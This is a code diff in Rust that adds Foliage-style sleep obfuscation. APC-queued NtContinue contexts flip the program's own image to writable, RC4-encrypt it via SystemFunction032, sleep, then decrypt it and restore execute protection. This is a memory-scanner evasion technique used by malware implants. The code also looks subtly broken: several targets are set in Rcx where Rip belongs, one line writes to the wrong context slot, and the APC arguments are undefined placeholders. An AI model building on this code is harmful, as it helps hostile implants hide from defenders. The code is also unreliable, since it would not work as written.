@@ -7,14 +7,19 @@ use std::{
 
 use ntapi::{
     ntexapi::NtCreateEvent,
-    ntpsapi::{NtCreateThreadEx, NtGetContextThread, NtTestAlert},
+    ntobapi::NtWaitForSingleObject,
+    ntpsapi::{NtCreateThreadEx, NtGetContextThread, NtQueueApcThread, NtTestAlert},
+    ntxcapi::NtContinue,
 };
 use windows_sys::Win32::System::{
     Diagnostics::Debug::{CONTEXT, CONTEXT_FULL_AMD64, EX_PROP_INFO_LOCKBYTES, IMAGE_NT_HEADERS64},
     Kernel::SynchronizationEvent,
     LibraryLoader::{GetModuleHandleA, GetProcAddress, LoadLibraryA},
+    Memory::{PAGE_EXECUTE_READ, PAGE_READWRITE, VirtualProtect},
     SystemServices::IMAGE_DOS_HEADER,
-    Threading::{EVENT_ALL_ACCESS, GetCurrentProcess, THREAD_ALL_ACCESS},
+    Threading::{
+        EVENT_ALL_ACCESS, ExitThread, GetCurrentProcess, THREAD_ALL_ACCESS, WaitForSingleObjectEx,
+    },
 };
 
 #[repr(C)]
@@ -42,6 +47,7 @@ fn foliage(sleep_time: u32) {
         let mut event_sync: *mut c_void = null_mut();
         let mut thread_handle: *mut c_void = null_mut();
         let mut key: [u8; 16] = [0; 16];
+        let mut old_protection: u32 = 0;
 
         let image_base = GetModuleHandleA(null_mut());
         let dos_header = image_base as *const IMAGE_DOS_HEADER;
@@ -121,6 +127,54 @@ fn foliage(sleep_time: u32) {
         }
 
         *(ctx_init.Rsp as *mut c_void) = NtTestAlert as _;
+
+        let mut ctx: [CONTEXT; 7] = [ctx_init; 7];
+
+        ctx[0].Rcx = NtWaitForSingleObject as *const () as u64;
+        ctx[0].Rdx = event_sync as u64;
+        ctx[0].R8 = 0;
+        ctx[0].R9 = 0;
+
+        ctx[1].Rip = VirtualProtect as *const () as u64;
+        ctx[1].Rcx = image_base as u64;
+        ctx[1].Rdx = image_size as u64;
+        ctx[1].R8 = PAGE_READWRITE as u64;
+        ctx[1].R9 = &mut old_protection as *mut _ as u64;
+
+        ctx[2].Rcx = systemfunction032 as *const () as u64;
+        ctx[2].Rdx = &image as *const _ as u64;
+        ctx[2].R8 = &key_bytes as *const _ as u64;
+
+        ctx[3].Rip = WaitForSingleObjectEx as *const () as u64;
+        ctx[3].Rcx = GetCurrentProcess() as u64;
+        ctx[3].Rdx = sleep_time as u64;
+        ctx[3].R8 = 0;
+
+        ctx[4].Rip = systemfunction032 as *const () as u64;
+        ctx[4].Rcx = &image as *const _ as u64;
+        ctx[4].Rdx = &key_bytes as *const _ as u64;
+
+        ctx[5].Rip = VirtualProtect as *const () as u64;
+        ctx[5].Rcx = image_base as u64;
+        ctx[5].Rdx = image_size as u64;
+        ctx[5].R8 = PAGE_EXECUTE_READ as u64;
+        ctx[5].R9 = &mut old_protection as *mut _ as u64;
+
+        ctx[6].Rip = ExitThread as *const () as u64;
+        ctx[5].Rcx = 0;
+
+        for i in 0..7 {
+            if (!nt_success(NtQueueApcThread(
+                thread_handle as *mut _,
+                NtContinue,
+                ApcArgument1,
+                ApcArgument2,
+                ApcArgument3,
+            ))) {
+                println!("[-] Failed to queue APC for context {}", i);
+                return;
+            }
+        }
     }
 }
 
